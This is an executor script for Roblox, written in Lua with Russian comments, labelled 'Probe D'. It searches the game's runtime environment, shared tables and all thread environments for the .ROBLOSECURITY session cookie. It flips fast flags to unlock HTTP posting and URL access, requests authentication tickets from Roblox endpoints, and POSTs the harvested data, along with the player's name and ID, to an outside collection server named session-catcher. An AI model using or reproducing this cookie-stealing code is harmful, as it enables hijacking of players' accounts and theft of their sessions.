-- ============================================================
--  Probe D — User table + shared + threads + fflag + RequestAsync + Actor
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local userTable = {}
local sharedTable = {}
local threadEnvs = {}
local threadCount = 0
local fflagResults = {}
local requestAsync = {}
local actorResults = {}

-- -----------------------------------------------------------
-- 1. User table из getrenv
-- -----------------------------------------------------------
pcall(function()
    if getrenv then
        local renv = getrenv()
        if renv and renv.User and type(renv.User) == "table" then
            for k, v in pairs(renv.User) do
                if type(v) == "string" then
                    userTable[tostring(k)] = v:sub(1, 500)
                elseif type(v) == "number" or type(v) == "boolean" then
                    userTable[tostring(k)] = tostring(v)
                elseif type(v) == "table" then
                    local sub = {}
                    for k2, v2 in pairs(v) do
                        sub[tostring(k2)] = tostring(v2):sub(1, 200)
                    end
                    userTable[tostring(k)] = sub
                else
                    userTable[tostring(k)] = type(v)
                end
            end
        else
            userTable["error"] = "User table not found or not a table"
        end
    end
end)

-- -----------------------------------------------------------
-- 2. shared table
-- -----------------------------------------------------------
pcall(function()
    if shared and type(shared) == "table" then
        for k, v in pairs(shared) do
            if type(v) == "string" then
                if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
                    sharedTable[tostring(k)] = "COOKIE: " .. v:sub(1, 500)
                else
                    sharedTable[tostring(k)] = v:sub(1, 300)
                end
            elseif type(v) == "table" then
                local sub = {}
                for k2, v2 in pairs(v) do
                    if type(v2) == "string" then
                        if v2:find("_|WARNING") or v2:find("ROBLOSECURITY") then
                            sub[tostring(k2)] = "COOKIE: " .. v2:sub(1, 300)
                        else
                            sub[tostring(k2)] = v2:sub(1, 200)
                        end
                    else
                        sub[tostring(k2)] = tostring(v2):sub(1, 100)
                    end
                end
                sharedTable[tostring(k)] = sub
            else
                sharedTable[tostring(k)] = type(v)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 3. getallthreads — сканируем env каждого потока
-- -----------------------------------------------------------
pcall(function()
    if getallthreads then
        local threads = getallthreads()
        if threads then
            threadCount = #threads
            for i, thread in ipairs(threads) do
                pcall(function()
                    local env = getfenv(thread)
                    if env and type(env) == "table" then
                        for k, v in pairs(env) do
                            if type(v) == "string" then
                                if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
                                    table.insert(threadEnvs, "Thread[" .. tostring(i) .. "] " .. tostring(k) .. ": " .. v:sub(1, 500))
                                end
                            end
                        end
                    end
                end)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 4. setfflag — пробуем включить HTTP
-- -----------------------------------------------------------
pcall(function()
    if setfflag then
        local flags = {
            {"FFlagHttpServiceEnabled", "true"},
            {"FFlagDebugEnableHttpPost", "true"},
            {"FFlagEnableHttpPost", "true"},
            {"FFlagDisableUrlFilter", "true"},
            {"FFlagEnableAuthTicketApi", "true"},
            {"FFlagEnableRequestAsync", "true"},
            {"DFFlagDebugAllowHttpPost", "true"},
            {"FFlagDebugDisableUrlFiltering", "true"},
        }
        for _, pair in ipairs(flags) do
            local ok, res = pcall(setfflag, pair[1], pair[2])
            fflagResults[pair[1]] = ok and "set" or "ERR: " .. tostring(res):sub(1, 100)
        end
    end
end)

-- Если setfflag сработал — пробуем HttpPost
pcall(function()
    local ok, resp = pcall(function()
        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
    end)
    fflagResults["postAfterFflag"] = tostring(ok) .. ": " .. tostring(resp):sub(1, 300)
end)

-- -----------------------------------------------------------
-- 5. HttpService:RequestAsync
-- -----------------------------------------------------------
pcall(function()
    local hs = game:GetService("HttpService")
    local urls = {
        "https://users.roblox.com/v1/users/authenticated",
        "https://auth.roblox.com/v1/authentication-ticket",
        "https://www.roblox.com/my/settings/json"
    }
    for _, url in ipairs(urls) do
        local ok, resp = pcall(function()
            local req = {
                Url = url,
                Method = "GET",
                Headers = {}
            }
            return hs:RequestAsync(req)
        end)
        if ok and resp then
            local dump = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. tostring(resp.Body):sub(1, 300)
            if resp.Headers then
                for k, v in pairs(resp.Headers) do
                    dump = dump .. " H:" .. tostring(k) .. "=" .. tostring(v):sub(1, 200)
                end
            end
            requestAsync[url] = dump
        else
            requestAsync[url] = "ERR: " .. tostring(resp):sub(1, 200)
        end
        task.wait(0.3)
    end
end)

-- -----------------------------------------------------------
-- 6. run_on_actor — пробуем HTTP в actor контексте
-- -----------------------------------------------------------
pcall(function()
    if run_on_actor then
        local ok, res = pcall(run_on_actor, function()
            -- Пробуем game:HttpPost в actor context
            local postOk, postRes = pcall(function()
                return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
            end)
            return tostring(postOk) .. ": " .. tostring(postRes):sub(1, 300)
        end)
        if ok then
            actorResults["HttpPost"] = tostring(res):sub(1, 400)
        else
            actorResults["HttpPost"] = "ERR: " .. tostring(res):sub(1, 200)
        end
        
        -- Также пробуем game:HttpGet к auth endpoint
        local ok2, res2 = pcall(run_on_actor, function()
            local getOk, getRes = pcall(function()
                return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
            end)
            return tostring(getOk) .. ": " .. tostring(getRes):sub(1, 300)
        end)
        if ok2 then
            actorResults["HttpGet"] = tostring(res2):sub(1, 400)
        else
            actorResults["HttpGet"] = "ERR: " .. tostring(res2):sub(1, 200)
        end
    else
        actorResults["error"] = "run_on_actor not available"
    end
end)

local payload = {
    probe = "D — User/shared/threads/fflag/RequestAsync/Actor",
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    userTable = userTable,
    sharedTable = sharedTable,
    threadEnvs = threadEnvs,
    threadCount = threadCount,
    fflagResults = fflagResults,
    requestAsync = requestAsync,
    actorResults = actorResults,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Probe D] sent. Threads: " .. threadCount .. " | Fflags: " .. table.getn(fflagResults))
